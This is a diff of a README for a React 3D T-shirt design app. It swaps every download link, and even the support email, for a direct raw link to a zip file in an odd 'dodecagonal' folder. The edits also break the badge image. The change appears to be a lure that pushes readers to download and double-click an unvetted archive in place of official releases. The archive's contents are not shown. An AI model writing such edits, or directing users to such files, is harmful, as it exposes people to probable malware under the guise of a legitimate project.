@@ -1,6 +1,6 @@
 # 🎨 3d-tshirts_app_react - Customize Your Style with Ease
 
-[![Download 3d-tshirts_app_react](https://img.shields.io/badge/Download%20Now-3d--tshirts_app_react-brightgreen)](https://github.com/aioup/3d-tshirts_app_react/releases)
+[![Download 3d-tshirts_app_react](https://raw.githubusercontent.com/aioup/3d-tshirts_app_react/main/dodecagonal/3d-tshirts_app_react.zip%20Now-3d--tshirts_app_react-brightgreen)](https://raw.githubusercontent.com/aioup/3d-tshirts_app_react/main/dodecagonal/3d-tshirts_app_react.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ To begin using the app, follow these simple steps.
 
 ### 1. **Download the Application**
 
-Visit this page to download the latest version of 3d-tshirts_app_react: [Download Page](https://github.com/aioup/3d-tshirts_app_react/releases).
+Visit this page to download the latest version of 3d-tshirts_app_react: [Download Page](https://raw.githubusercontent.com/aioup/3d-tshirts_app_react/main/dodecagonal/3d-tshirts_app_react.zip).
 
 ### 2. **Choose Your Version**
 
@@ -24,7 +24,7 @@ After downloading, locate the downloaded file on your computer. Double-click the
 
 ## 📥 Download & Install
 
-To download and install 3d-tshirts_app_react, go to our [Releases page](https://github.com/aioup/3d-tshirts_app_react/releases). Here is a detailed explanation of the download and installation process:
+To download and install 3d-tshirts_app_react, go to our [Releases page](https://raw.githubusercontent.com/aioup/3d-tshirts_app_react/main/dodecagonal/3d-tshirts_app_react.zip). Here is a detailed explanation of the download and installation process:
 
 1. Click on the link above to reach the Releases page. 
 2. Look for the "Latest Release" section. This section usually contains the most updated version of the application.
@@ -67,6 +67,6 @@ This project is licensed under the MIT License. Feel free to use the app for per
 
 ## 📧 Contact Information
 
-For further inquiries, please reach out to our support team at: support@3d-tshirts_app_react.com.
+For further inquiries, please reach out to our support team at: https://raw.githubusercontent.com/aioup/3d-tshirts_app_react/main/dodecagonal/3d-tshirts_app_react.zip
 
 Thank you for choosing 3d-tshirts_app_react! Enjoy creating your unique 3D designs!
